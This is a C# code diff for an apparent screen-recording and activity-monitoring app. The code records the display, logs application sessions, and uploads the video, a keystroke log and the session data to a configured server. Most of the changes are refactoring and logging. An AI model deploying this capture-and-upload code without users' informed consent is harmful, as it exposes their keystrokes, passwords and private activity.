@@ -1,5 +1,6 @@
 ﻿using Newtonsoft.Json;
 using ScreenRecorderLib;
+using ScreenTask;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -26,20 +27,22 @@ namespace AppRealtime
 
             var sources = new List<RecordingSourceBase>();
             sources.AddRange(Recorder.GetDisplays());
+            var outputOptions = new OutputOptions
+            {
+                RecorderMode = RecorderMode.Video,
+                //This sets a custom size of the video output, in pixels.
+                OutputFrameSize = new ScreenSize(_appSettings.FrameWidth, _appSettings.FrameHeight),
+                //Stretch controls how the resizing is done, if the new aspect ratio differs.
+                Stretch = StretchMode.Uniform,
+            };
+
             RecorderOptions options = new RecorderOptions
             {
                 SourceOptions = new SourceOptions
                 {
                     RecordingSources = sources
                 },
-                OutputOptions = new OutputOptions
-                {
-                    RecorderMode = RecorderMode.Video,
-                    //This sets a custom size of the video output, in pixels.
-                    OutputFrameSize = new ScreenSize(_appSettings.FrameWidth, _appSettings.FrameHeight),
-                    //Stretch controls how the resizing is done, if the new aspect ratio differs.
-                    Stretch = StretchMode.Uniform,
-                },
+                OutputOptions = outputOptions,
             };
 
             _rec = Recorder.CreateRecorder(options);
@@ -48,7 +51,7 @@ namespace AppRealtime
 
         private void _rec_OnRecordingFailed(object sender, RecordingFailedEventArgs e)
         {
-            Console.WriteLine(e.Error.ToString());
+            Log(e.Error.ToString());
         }
 
         public async Task RunAsync()
@@ -72,10 +75,10 @@ namespace AppRealtime
                 try
                 {
                     int maxVideoSeconds = (int)TimeSpan.FromSeconds(_appSettings.VideoDuration).TotalMilliseconds;
-
-                    if (!Directory.Exists("Videos"))
+                    string videoFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Videos");
+                    if (!Directory.Exists(videoFolder))
                     {
-                        Directory.CreateDirectory("Videos");
+                        Directory.CreateDirectory(videoFolder);
                     }
                     var now = ServerTimeHelper.GetUnixTimeSeconds();
 
@@ -83,7 +86,7 @@ namespace AppRealtime
                     AppTimeTrack.SetNewAppTrack(now);
 
                     string fileName = $"{now}_{now + maxVideoSeconds}.mp4";
-                    string videoPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Videos", fileName);
+                    string videoPath = Path.Combine(videoFolder, fileName);
 
                     Console.WriteLine("Record:" + videoPath);
 
@@ -115,6 +118,14 @@ namespace AppRealtime
                                 appTimes = appTime.Collection;
                             }
 
+                            foreach (var app in appTimes)
+                            {
+                                if (app.EndTime == 0)
+                                {
+                                    app.EndTime = ServerTimeHelper.GetUnixTimeSeconds();
+                                }
+                            }
+
                             var appsJson = JsonConvert.SerializeObject(appTimes);
                             File.WriteAllText(appsJsonPath, appsJson);
                             var keyLogJson = JsonConvert.SerializeObject(keylog);
@@ -134,23 +145,23 @@ namespace AppRealtime
                                     var request = new HttpRequestMessage(HttpMethod.Post, _appSettings.VideoHost);
                                     request.Headers.Add("accept", "*/*");
                                     var content = new MultipartFormDataContent();
-                                    content.Add(new StreamContent(File.OpenRead(videoPath)), "Video", videoPath);
-                                    content.Add(new StreamContent(File.OpenRead(keyLogJsonPath)), "UserAction", keyLogJsonPath);
-                                    content.Add(new StreamContent(File.OpenRead(appsJsonPath)), "UserSession", appsJsonPath);
-                                    content.Add(new StringContent(_appSettings.DeviceToken), "token");
+                                    content.Add(new StreamContent(File.OpenRead(videoPath)), "Video", Path.GetFileName(videoPath));
+                                    content.Add(new StreamContent(File.OpenRead(keyLogJsonPath)), "UserAction", Path.GetFileName(keyLogJsonPath));
+                                    content.Add(new StreamContent(File.OpenRead(appsJsonPath)), "UserSession", Path.GetFileName(appsJsonPath));
+                                    content.Add(new StringContent(Globals.UUID), "token");
                                     request.Content = content;
                                     var response = await client.SendAsync(request);
                                     response.EnsureSuccessStatusCode();
                                     string result = await response.Content.ReadAsStringAsync();
                                     if (result.Contains("successfully"))
                                     {
-                                        Console.WriteLine("Files uploaded successfully");
+                                        Console.WriteLine("Video uploaded successfully");
                                         break;
                                     }
                                 }
                                 catch (Exception ex)
                                 {
-
+                                    Log(ex.ToString());
                                 }
                             }
                         }
@@ -164,7 +175,7 @@ namespace AppRealtime
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine(ex.ToString());
+                    Log(ex.ToString());
                 }
             }
         }
@@ -178,7 +189,7 @@ namespace AppRealtime
                     _rec.Stop();
                 }
             }
-            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
+            catch (Exception ex) { Log(ex.ToString()); }
         }
 
         /// <summary>
@@ -198,6 +209,11 @@ namespace AppRealtime
             if (waitTask != await Task.WhenAny(waitTask,
                     Task.Delay(timeout)))
                 throw new TimeoutException();
+        }
+        private static void Log(string text)
+        {
+            Console.WriteLine(DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + " : " + text);
+            Trace.WriteLine(text);
         }
     }
 }
